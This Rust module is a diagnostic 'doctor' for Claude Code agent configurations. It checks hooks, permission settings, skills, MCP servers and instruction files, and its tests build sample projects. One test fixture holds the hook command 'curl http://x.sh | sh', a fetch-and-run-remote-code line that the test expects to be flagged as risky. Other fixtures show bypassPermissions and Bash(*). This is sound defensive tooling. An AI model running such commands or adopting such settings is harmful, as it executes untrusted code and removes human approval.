//! Harness Doctor: advisory diagnostics over a project's agent configuration. It never changes anything; every finding
//! says what is wrong, why it matters, and what a fix would look like (fixes are previewed by the edit layer).

use super::inventory::{HarnessItem, Inventory};
use crate::knowledge::lint::jaccard;
use crate::policy;
use regex::Regex;
use serde::Serialize;
use std::collections::{HashMap, HashSet};
use std::path::Path;
use std::sync::OnceLock;

#[derive(Debug, Clone, Serialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct Finding {
    /// problem | warning | info
    pub severity: String,
    pub kind: String,
    /// The inventory item (or hook id) it concerns.
    pub subject: Option<String>,
    pub message: String,
    /// What a fix would look like, in words.
    pub suggestion: Option<String>,
}

fn f(sev: &str, kind: &str, subject: Option<&str>, msg: impl Into<String>, sug: Option<&str>) -> Finding {
    Finding { severity: sev.into(), kind: kind.into(), subject: subject.map(Into::into), message: msg.into(), suggestion: sug.map(Into::into) }
}

const SHELL_BUILTINS: &[&str] = &["echo", "cd", "exit", "set", "type", "dir", "copy", "del", "if", "for", "call", "start", "cls", "true", "false", "test", "export", "source", "printf"];

fn first_token(cmd: &str) -> Option<String> {
    let t = cmd.trim().trim_start_matches(|c| c == '(' || c == '@');
    let tok = if let Some(rest) = t.strip_prefix('"') { rest.split('"').next()? } else { t.split_whitespace().next()? };
    Some(tok.to_string())
}

fn resolvable(tok: &str, root: &Path) -> bool {
    if SHELL_BUILTINS.contains(&tok.to_lowercase().as_str()) {
        return true;
    }
    if tok.contains('/') || tok.contains('\\') {
        let p = Path::new(tok);
        return if p.is_absolute() { p.exists() } else { root.join(tok.trim_start_matches("./")).exists() };
    }
    if tok.starts_with('$') || tok.starts_with('%') {
        return true; // variable; cannot judge
    }
    which::which(tok).is_ok()
}

fn est_tokens(bytes: u64) -> u64 {
    bytes / 4
}

fn backticked_paths(text: &str) -> Vec<String> {
    static R: OnceLock<Regex> = OnceLock::new();
    let re = R.get_or_init(|| Regex::new(r"`([A-Za-z0-9_.\-]+(?:/[A-Za-z0-9_.\-]+)+/?)`").unwrap());
    re.captures_iter(text).map(|c| c[1].to_string()).collect()
}

fn directives(text: &str) -> Vec<(bool, String, String)> {
    static POS: OnceLock<Regex> = OnceLock::new();
    static NEG: OnceLock<Regex> = OnceLock::new();
    let pos = POS.get_or_init(|| Regex::new(r"(?i)\b(?:always|must)\s+(?:use|run|add|include|prefer)\s+`?([A-Za-z0-9_./\-]{2,})`?").unwrap());
    let neg = NEG.get_or_init(|| Regex::new(r"(?i)\b(?:never|do not|don't|must not|avoid)\s+(?:use|run|add|include|using)\s+`?([A-Za-z0-9_./\-]{2,})`?").unwrap());
    let mut out = vec![];
    for line in text.lines() {
        for c in pos.captures_iter(line) {
            out.push((true, c[1].to_lowercase(), line.trim().to_string()));
        }
        for c in neg.captures_iter(line) {
            out.push((false, c[1].to_lowercase(), line.trim().to_string()));
        }
    }
    out
}

pub fn run(inv: &Inventory, root: &Path) -> Vec<Finding> {
    let mut out = vec![];

    // 1. context that is loaded on every turn
    let always: Vec<&HarnessItem> = inv.items.iter().filter(|i| i.loaded_in_missions && matches!(i.kind.as_str(), "instructions" | "rule") && i.details.get("paths").map(|p| p.is_null()).unwrap_or(true)).collect();
    let total: u64 = always.iter().map(|i| i.bytes).sum();
    if total > 24 * 1024 {
        out.push(f("warning", "always_loaded_context", None, format!("{} file(s) of instructions are loaded on every turn: about {} tokens (estimate = characters ÷ 4). Large always-on context crowds out the task and dilutes the rules that matter.", always.len(), est_tokens(total)), Some("Move rarely-needed detail into skills (loaded on demand) or path-scoped rules, and keep CLAUDE.md to what is true for every task.")));
    }
    for i in always.iter().filter(|i| i.bytes > 12 * 1024) {
        out.push(f("info", "large_instruction_file", Some(&i.id), format!("{} is {} KB (~{} tokens est.) and loads on every turn", i.name, i.bytes / 1024, est_tokens(i.bytes)), Some("Split it: stable rules stay, procedures become skills.")));
    }

    // 2. hooks
    for h in &inv.hooks {
        if !h.known_event {
            out.push(f("problem", "unknown_hook_event", Some(&h.id), format!("`{}` is not a Claude hook event, so this hook will never fire", h.event), Some("Use the exact, case-sensitive event name (for example PreToolUse, PostToolUse, SessionStart, Stop, PreCompact).")));
        }
        if h.kind == "command" {
            if h.command.trim().is_empty() {
                out.push(f("problem", "empty_hook_command", Some(&h.id), format!("the {} hook has no command", h.event), Some("Remove it or give it a command.")));
            } else {
                if let Some(tok) = first_token(&h.command) {
                    if !resolvable(&tok, root) {
                        out.push(f("warning", "hook_command_not_found", Some(&h.id), format!("the {} hook runs `{tok}`, which was not found on PATH or in the project", h.event), Some("Install the tool, fix the path, or remove the hook; a failing hook can block tool calls.")));
                    }
                }
                for risk in policy::shell_risks(&h.command) {
                    out.push(f("warning", "risky_hook_command", Some(&h.id), format!("the {} hook command looks risky ({risk}); hooks run automatically with your privileges", h.event), Some("Narrow the command, or require approval instead of automating it.")));
                }
            }
            if h.timeout_secs.is_none() && h.scope != "user" {
                out.push(f("info", "hook_without_timeout", Some(&h.id), format!("the {} hook has no explicit timeout", h.event), Some("Set a timeout so a hung hook cannot stall the agent.")));
            }
        }
        if h.scope != "user" && h.event == "PreToolUse" && h.matcher.as_deref().map(|m| m.is_empty() || m == "*").unwrap_or(true) && h.kind == "command" {
            out.push(f("info", "broad_pretooluse", Some(&h.id), "this PreToolUse hook matches every tool call and runs a program each time".to_string(), Some("Add a matcher (for example Write|Edit) so it only runs where it is needed.")));
        }
    }
    if inv.hooks.iter().any(|h| h.scope != "user") {
        out.push(f("info", "hooks_not_run_in_missions", None, "Project hooks run in your own Claude Code sessions, but FORGE missions deliberately do not run them (a repository must not execute code on session start). Use FORGE's own approval policy for mission-time guardrails.".to_string(), None));
    }

    // 3. permissions
    for i in inv.items.iter().filter(|i| i.kind == "settings") {
        for a in i.details["allow"].as_array().cloned().unwrap_or_default().iter().filter_map(|v| v.as_str()) {
            let broad = matches!(a, "*" | "Bash" | "Bash(*)" | "Write" | "Edit" | "WebFetch") || a.starts_with("Bash(*") || a == "mcp__*";
            if broad {
                out.push(f("warning", "broad_permission", Some(&i.id), format!("`{a}` is allowed without asking, in {}", i.name), Some("Allow specific commands (for example Bash(npm test)) instead of a whole tool.")));
            }
        }
        if i.details["defaultMode"].as_str() == Some("bypassPermissions") {
            out.push(f("problem", "bypass_permissions", Some(&i.id), format!("{} sets defaultMode to bypassPermissions: every tool runs with no prompts", i.name), Some("Remove it. FORGE never uses this mode.")));
        }
        for w in &i.warnings {
            out.push(f("warning", "settings_parse", Some(&i.id), format!("{}: {w}", i.name), None));
        }
    }

    // 4. skills and subagents
    let skills: Vec<&HarnessItem> = inv.items.iter().filter(|i| i.kind == "skill" && i.scope != "user").collect();
    let mut by_name: HashMap<String, Vec<&HarnessItem>> = HashMap::new();
    for s in &skills {
        by_name.entry(s.name.to_lowercase()).or_default().push(s);
        for w in s.warnings.iter().filter(|w| w.contains("needs a `description`")) {
            out.push(f("warning", "skill_without_description", Some(&s.id), format!("skill \"{}\": {w}", s.name), Some("Add a one-line `description:` saying when to use it.")));
        }
        if s.details["allowedTools"].as_str().is_some_and(|t| t.contains("Bash(*") || t.trim() == "Bash" || t.trim() == "*") {
            out.push(f("warning", "skill_broad_tools", Some(&s.id), format!("skill \"{}\" grants unrestricted shell access via allowed-tools", s.name), Some("List only the commands it needs.")));
        }
    }
    for (name, v) in &by_name {
        if v.len() > 1 {
            out.push(f("warning", "duplicate_skill_name", Some(&v[0].id), format!("{} skills are named \"{name}\"", v.len()), Some("Rename or merge them; only one can be chosen reliably.")));
        }
    }
    let descs: Vec<(&HarnessItem, HashSet<String>)> = skills.iter().filter_map(|s| s.description.as_deref().map(|d| (*s, d.to_lowercase().split(|c: char| !c.is_alphanumeric()).filter(|w| w.len() > 2).map(String::from).collect()))).collect();
    for a in 0..descs.len() {
        for b in (a + 1)..descs.len() {
            if descs[a].0.name != descs[b].0.name && jaccard(&descs[a].1, &descs[b].1) >= 0.8 {
                out.push(f("info", "overlapping_skills", Some(&descs[a].0.id), format!("skills \"{}\" and \"{}\" have nearly identical descriptions; the agent may pick the wrong one", descs[a].0.name, descs[b].0.name), Some("Differentiate the descriptions or merge the skills.")));
            }
        }
    }
    for s in inv.items.iter().filter(|i| i.kind == "subagent" && i.scope != "user") {
        if s.details["tools"].is_null() {
            out.push(f("info", "subagent_inherits_all_tools", Some(&s.id), format!("subagent \"{}\" does not restrict `tools`, so it inherits every tool", s.name), Some("List only the tools it needs (for example Read, Grep for a reviewer).")));
        }
    }

    // 5. MCP
    for m in inv.mcp_servers.iter().filter(|m| m.scope != "user" && m.transport == "stdio") {
        out.push(f("info", "mcp_stdio_server", Some(&m.source_item), format!("MCP server \"{}\" launches a local program ({})", m.name, m.command.clone().unwrap_or_default()), Some("Only keep servers you trust; FORGE missions do not start project MCP servers.")));
    }

    // 6. stale references and contradictions in instructions
    let mut seen_dir: HashMap<String, bool> = HashMap::new();
    let mut dirs_by_item: Vec<(&HarnessItem, Vec<(bool, String, String)>)> = vec![];
    for i in inv.items.iter().filter(|i| matches!(i.kind.as_str(), "instructions" | "rule") && i.scope != "user") {
        let Ok(Some(bytes)) = super::edit::read_bytes(std::path::Path::new(&i.path)) else { continue };
        let text = String::from_utf8_lossy(&bytes).into_owned();
        let mut missing = 0;
        for p in backticked_paths(&text).into_iter().take(60) {
            let exists = *seen_dir.entry(p.clone()).or_insert_with(|| root.join(p.trim_end_matches('/')).exists());
            if !exists && missing < 5 {
                missing += 1;
                out.push(f("info", "stale_path", Some(&i.id), format!("{} mentions `{p}`, which does not exist in the project", i.name), Some("Update or remove the reference.")));
            }
        }
        dirs_by_item.push((i, directives(&text)));
    }
    // Index each file's directives by subject and polarity (first line wins), so the work is linear in distinct subjects no
    // matter how many times a file repeats itself, and report each contradicting subject once per pair of files.
    type Index = HashMap<String, (Option<String>, Option<String>)>;
    let indexed: Vec<(&HarnessItem, Index)> = dirs_by_item
        .iter()
        .map(|(item, ds)| {
            let mut ix: Index = HashMap::new();
            for (positive, subject, line) in ds {
                let slot = ix.entry(subject.clone()).or_default();
                let cell = if *positive { &mut slot.0 } else { &mut slot.1 };
                if cell.is_none() {
                    *cell = Some(line.clone());
                }
            }
            (*item, ix)
        })
        .collect();
    'pairs: for a in 0..indexed.len() {
        for b in (a + 1)..indexed.len() {
            let mut subjects: Vec<&String> = indexed[a].1.keys().filter(|k| indexed[b].1.contains_key(*k)).collect();
            subjects.sort();
            for subject in subjects {
                let (pa, na) = &indexed[a].1[subject];
                let (pb, nb) = &indexed[b].1[subject];
                let pair = match (pa, nb, na, pb) {
                    (Some(la), Some(lb), _, _) => Some((la, lb)),
                    (_, _, Some(la), Some(lb)) => Some((la, lb)),
                    _ => None,
                };
                if let Some((la, lb)) = pair {
                    out.push(f("warning", "possible_contradiction", Some(&indexed[a].0.id), format!("{} says \"{la}\" but {} says \"{lb}\"", indexed[a].0.name, indexed[b].0.name), Some("Decide which is right and remove the other. (Heuristic: it only pairs always/never statements about the same word.)")));
                    if out.iter().filter(|x| x.kind == "possible_contradiction").count() >= PER_KIND_CAP {
                        break 'pairs;
                    }
                }
            }
        }
    }

    // 7. provider compatibility
    precedence(inv, &mut out);

    let has = |rel: &str| inv.items.iter().any(|i| i.rel.as_deref() == Some(rel));
    if has("AGENTS.md") && !has("CLAUDE.md") && !has(".claude/CLAUDE.md") {
        out.push(f("info", "agents_md_only", None, "AGENTS.md exists but there is no CLAUDE.md: Claude Code does not read AGENTS.md, so FORGE missions on Claude will not see it".to_string(), Some("Add a CLAUDE.md that imports it (a line containing @AGENTS.md).")));
    }

    out.sort_by_key(|x| match x.severity.as_str() {
        "problem" => 0,
        "warning" => 1,
        _ => 2,
    });
    cap_per_kind(out)
}

/// Claude Code reads settings from several files; for a plain value the most specific wins (local > project > user, and
/// managed policy above all, which FORGE does not read). For permission rules, a deny anywhere beats an allow anywhere,
/// and ask beats allow. These findings say which value a person's own Claude Code sessions will actually get. FORGE
/// missions use none of it (their permissions come from FORGE policy), and each message says so.
fn precedence(inv: &Inventory, out: &mut Vec<Finding>) {
    const ORDER: [&str; 3] = ["local", "project", "user"];
    let settings: Vec<&HarnessItem> = ORDER.iter().filter_map(|sc| inv.items.iter().find(|i| i.kind == "settings" && i.scope == *sc)).collect();
    if settings.len() < 2 {
        return;
    }
    let note = "Your own Claude Code sessions get this; FORGE missions ignore these settings and use FORGE policy.";
    for (key, label) in [("defaultMode", "permission mode"), ("model", "model")] {
        let set: Vec<(&str, String)> = settings.iter().filter_map(|i| i.details.get(key).filter(|v| !v.is_null()).map(|v| (i.scope.as_str(), v.as_str().map(str::to_string).unwrap_or_else(|| v.to_string())))).collect();
        let distinct: HashSet<&String> = set.iter().map(|(_, v)| v).collect();
        if distinct.len() > 1 {
            let (win_scope, win) = &set[0];
            let all = set.iter().map(|(s, v)| format!("{s}: `{v}`")).collect::<Vec<_>>().join(", ");
            let subject = settings.iter().find(|i| i.scope == *win_scope).map(|i| i.id.as_str());
            out.push(f("info", "setting_overridden", subject, format!("The {label} is set differently in more than one settings file ({all}); `{win}` from {win_scope} applies, because local beats project beats user. {note}"), Some("Keep the value in one place, or make the override deliberate (local settings are personal and usually not committed).")));
        }
    }
    let rules = |i: &HarnessItem, list: &str| -> Vec<String> { i.details.get(list).and_then(serde_json::Value::as_array).map(|a| a.iter().filter_map(|v| v.as_str().map(str::to_string)).collect()).unwrap_or_default() };
    let mut reported = HashSet::new();
    for a in &settings {
        for rule in rules(a, "allow") {
            for (other, list, outcome) in settings.iter().flat_map(|b| [(b, "deny", "denied"), (b, "ask", "asked about")]) {
                if rules(other, list).contains(&rule) && reported.insert((rule.clone(), list)) {
                    out.push(f(
                        "warning",
                        "permission_conflict",
                        Some(&a.id),
                        format!("`{rule}` is allowed in {} settings but listed under {list} in {} settings: it is {outcome}, because {list} beats allow wherever it appears. {note}", a.scope, other.scope),
                        Some("Remove the rule from one of the lists so the file says what actually happens."),
                    ));
                }
            }
        }
    }
}

/// No single kind of finding may flood the screen (or memory): keep the first `PER_KIND_CAP` and say how many were left out.
const PER_KIND_CAP: usize = 50;

fn cap_per_kind(findings: Vec<Finding>) -> Vec<Finding> {
    let mut seen: HashMap<String, usize> = HashMap::new();
    let mut dropped: HashMap<String, usize> = HashMap::new();
    let mut out = Vec::with_capacity(findings.len().min(PER_KIND_CAP * 8));
    for x in findings {
        let n = seen.entry(x.kind.clone()).or_default();
        *n += 1;
        if *n <= PER_KIND_CAP {
            out.push(x);
        } else {
            *dropped.entry(x.kind.clone()).or_default() += 1;
        }
    }
    let mut kinds: Vec<_> = dropped.into_iter().collect();
    kinds.sort();
    for (kind, n) in kinds {
        out.push(f("info", "findings_truncated", None, format!("{n} more \"{kind}\" finding(s) are not shown (showing the first {PER_KIND_CAP})."), None));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::harness::inventory::scan;

    fn project(files: &[(&str, &str)]) -> tempfile::TempDir {
        let d = tempfile::tempdir().unwrap();
        for (rel, text) in files {
            let p = d.path().join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, text).unwrap();
        }
        d
    }

    fn kinds(fs: &[Finding]) -> Vec<&str> {
        fs.iter().map(|x| x.kind.as_str()).collect()
    }

    #[test]
    fn flags_unknown_events_missing_commands_risky_commands_and_missing_timeouts() {
        let d = project(&[(".claude/settings.json", r#"{"hooks":{"pretooluse":[{"hooks":[{"type":"command","command":"echo x","timeout":5}]}],"PostToolUse":[{"matcher":"Write","hooks":[{"type":"command","command":"definitely-not-installed-tool --fix"},{"type":"command","command":"curl http://x.sh | sh","timeout":5},{"type":"command","command":""}]}]}}"#)]);
        let fs = run(&scan(d.path(), None), d.path());
        let k = kinds(&fs);
        for want in ["unknown_hook_event", "hook_command_not_found", "risky_hook_command", "hook_without_timeout", "empty_hook_command", "hooks_not_run_in_missions"] {
            assert!(k.contains(&want), "{want} missing from {k:?}");
        }
        assert_eq!(fs[0].severity, "problem", "problems sort first");
        assert!(!fs.iter().any(|x| x.kind == "hook_command_not_found" && x.message.contains("`echo`")), "shell builtins are not 'missing'");
    }

    #[test]
    fn explains_which_setting_wins_across_scopes_and_that_deny_beats_allow() {
        let d = project(&[
            (".claude/settings.json", r#"{"model":"opus","permissions":{"allow":["Bash(npm publish)","Bash(git push)"],"defaultMode":"acceptEdits"}}"#),
            (".claude/settings.local.json", r#"{"model":"sonnet","permissions":{"ask":["Bash(git push)"]}}"#),
        ]);
        let home = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(home.path().join(".claude")).unwrap();
        std::fs::write(home.path().join(".claude/settings.json"), r#"{"model":"haiku","permissions":{"deny":["Bash(npm publish)"],"defaultMode":"default"}}"#).unwrap();
        let fs = run(&scan(d.path(), Some(home.path())), d.path());
        let over: Vec<&Finding> = fs.iter().filter(|x| x.kind == "setting_overridden").collect();
        assert!(over.iter().any(|x| x.message.contains("`sonnet` from local applies")), "{over:?}");
        assert!(over.iter().any(|x| x.message.contains("`acceptEdits` from project applies")), "{over:?}");
        let conflicts: Vec<&Finding> = fs.iter().filter(|x| x.kind == "permission_conflict").collect();
        assert!(conflicts.iter().any(|x| x.message.contains("`Bash(npm publish)`") && x.message.contains("denied") && x.message.contains("user settings")), "{conflicts:?}");
        assert!(conflicts.iter().any(|x| x.message.contains("`Bash(git push)`") && x.message.contains("asked about")), "{conflicts:?}");
        assert!(fs.iter().filter(|x| x.kind == "setting_overridden" || x.kind == "permission_conflict").all(|x| x.message.contains("FORGE missions ignore")));
        // A single settings file has nothing to compare.
        let single = project(&[(".claude/settings.json", r#"{"model":"opus","permissions":{"allow":["Read"],"deny":["Read"]}}"#)]);
        assert!(!run(&scan(single.path(), None), single.path()).iter().any(|x| x.kind == "setting_overridden"));
    }

    #[test]
    fn flags_broad_permissions_and_bypass_mode() {
        let d = project(&[(".claude/settings.json", r#"{"permissions":{"allow":["Bash(*)","Bash(npm test)","Read"],"defaultMode":"bypassPermissions"}}"#)]);
        let fs = run(&scan(d.path(), None), d.path());
        assert!(fs.iter().any(|x| x.kind == "broad_permission" && x.message.contains("Bash(*)")));
        assert!(!fs.iter().any(|x| x.kind == "broad_permission" && x.message.contains("npm test")), "specific commands are fine");
        assert!(fs.iter().any(|x| x.kind == "bypass_permissions" && x.severity == "problem"));
    }

    #[test]
    fn flags_context_bloat_duplicate_skills_and_tool_exposure() {
        let big = "x".repeat(30 * 1024);
        let d = project(&[
            ("CLAUDE.md", &big),
            (".claude/skills/a/SKILL.md", "---\nname: deploy\ndescription: Deploy the service to staging safely\nallowed-tools: Bash(*)\n---\nsteps"),
            (".claude/skills/b/SKILL.md", "---\nname: deploy\ndescription: Deploy the service to staging safely\n---\nsteps"),
            (".claude/skills/c/SKILL.md", "---\nname: ship\ndescription: Deploy the service to staging safely\n---\nsteps"),
            (".claude/agents/r.md", "---\nname: reviewer\ndescription: reviews\n---\nbody"),
            (".mcp.json", r#"{"mcpServers":{"fs":{"command":"node","args":["s.js"]}}}"#),
        ]);
        let fs = run(&scan(d.path(), None), d.path());
        let k = kinds(&fs);
        for want in ["always_loaded_context", "large_instruction_file", "duplicate_skill_name", "overlapping_skills", "skill_broad_tools", "subagent_inherits_all_tools", "mcp_stdio_server"] {
            assert!(k.contains(&want), "{want} missing from {k:?}");
        }
    }

    #[test]
    fn flags_stale_paths_contradictions_and_agents_md_only() {
        let d = project(&[
            ("src/real.rs", "fn main(){}"),
            ("AGENTS.md", "See `src/real.rs` and `src/gone/missing.rs`.\nAlways use pnpm for installs.\n"),
            (".claude/rules/style.md", "Never use pnpm; use npm.\n"),
        ]);
        let fs = run(&scan(d.path(), None), d.path());
        assert!(fs.iter().any(|x| x.kind == "stale_path" && x.message.contains("src/gone/missing.rs")));
        assert!(!fs.iter().any(|x| x.kind == "stale_path" && x.message.contains("src/real.rs")));
        assert!(fs.iter().any(|x| x.kind == "possible_contradiction" && x.message.contains("pnpm")), "{:?}", kinds(&fs));
        assert!(fs.iter().any(|x| x.kind == "agents_md_only"));
    }

    #[test]
    fn a_clean_project_produces_no_findings() {
        let d = project(&[("CLAUDE.md", "# Rules\nKeep it small.\n"), (".claude/settings.json", r#"{"permissions":{"allow":["Bash(npm test)"]}}"#)]);
        assert!(run(&scan(d.path(), None), d.path()).is_empty());
    }

    #[test]
    fn a_repetitive_hostile_pair_of_files_cannot_flood_or_stall_the_doctor() {
        let always = "Always use npm\n".repeat(10_000);
        let never = "Never use npm\n".repeat(10_000);
        let d = project(&[("CLAUDE.md", &always), (".claude/rules/x.md", &never)]);
        let t = std::time::Instant::now();
        let fs = run(&scan(d.path(), None), d.path());
        assert!(t.elapsed() < std::time::Duration::from_secs(5), "took {:?}", t.elapsed());
        let n = fs.iter().filter(|x| x.kind == "possible_contradiction").count();
        assert_eq!(n, 1, "one finding per contradicting subject, however often it is repeated");
        assert!(fs.len() < 50, "{}", fs.len());
    }

    #[test]
    fn no_kind_of_finding_can_exceed_the_cap() {
        let mut many = vec![];
        for n in 0..500 {
            many.push((format!(".claude/skills/s{n}/SKILL.md"), format!("---\nname: dup\ndescription: d\nallowed-tools: Bash(*)\n---\nx{n}")));
        }
        let files: Vec<(&str, &str)> = many.iter().map(|(a, b)| (a.as_str(), b.as_str())).collect();
        let d = project(&files);
        let fs = run(&scan(d.path(), None), d.path());
        assert!(fs.iter().filter(|x| x.kind == "skill_broad_tools").count() <= PER_KIND_CAP);
        assert!(fs.iter().any(|x| x.kind == "findings_truncated"), "{:?}", kinds(&fs));
    }
}
